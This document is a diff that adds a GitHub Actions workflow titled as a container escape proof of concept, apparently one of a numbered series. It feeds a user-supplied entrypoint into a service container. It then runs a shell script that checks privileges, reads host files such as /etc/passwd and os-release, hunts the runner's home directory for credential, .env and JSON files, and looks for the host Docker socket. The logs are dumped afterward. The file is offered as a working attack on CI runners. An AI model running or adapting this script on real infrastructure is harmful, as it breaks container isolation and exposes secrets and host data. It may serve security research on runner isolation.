@@ -1,0 +1,49 @@
+name: "Test 11: Full container escape"
+on:
+  workflow_dispatch:
+    inputs:
+      entrypoint:
+        description: "Entrypoint"
+        required: false
+        default: "/bin/sh"
+jobs:
+  escape:
+    runs-on: ubuntu-latest
+    name: "Container Escape PoC"
+    services:
+      attacker:
+        image: alpine:3.19
+        entrypoint: ${{ github.event.inputs.entrypoint }}
+        command: >-
+          -c "
+          echo === CONTAINER ESCAPE PoC ===;
+          echo === PRIVILEGED CHECK ===;
+          cat /proc/self/status | grep -i cap;
+          echo === HOST DEVICES ===;
+          ls /dev/sda* 2>&1 | head -5;
+          echo === HOST PROCESSES via /proc ===;
+          ls /proc/*/cmdline 2>/dev/null | wc -l;
+          echo === HOST FILESYSTEM ===;
+          ls /host/etc/passwd 2>&1;
+          cat /host/etc/hostname 2>&1;
+          cat /host/etc/os-release 2>&1 | head -3;
+          echo === RUNNER SECRETS ===;
+          find /host/home/runner -name '.credentials' -o -name '*.json' -o -name '.env' 2>/dev/null | head -10;
+          ls /host/home/runner/work/_temp/ 2>/dev/null | head -10;
+          echo === DOCKER ON HOST ===;
+          ls /host/var/run/docker.sock 2>&1;
+          echo === DONE ===;
+          sleep 60
+          "
+    steps:
+      - name: Wait
+        run: sleep 15
+      - name: Escape results
+        run: |
+          for CID in $(docker ps -aq); do
+            echo "=== FULL ESCAPE RESULTS ==="
+            docker logs "$CID" 2>&1
+            echo ""
+            echo "=== CONTAINER CONFIG ==="
+            docker inspect "$CID" --format 'Privileged={{.HostConfig.Privileged}} PidMode={{.HostConfig.PidMode}} Binds={{.HostConfig.Binds}}' 2>&1
+          done
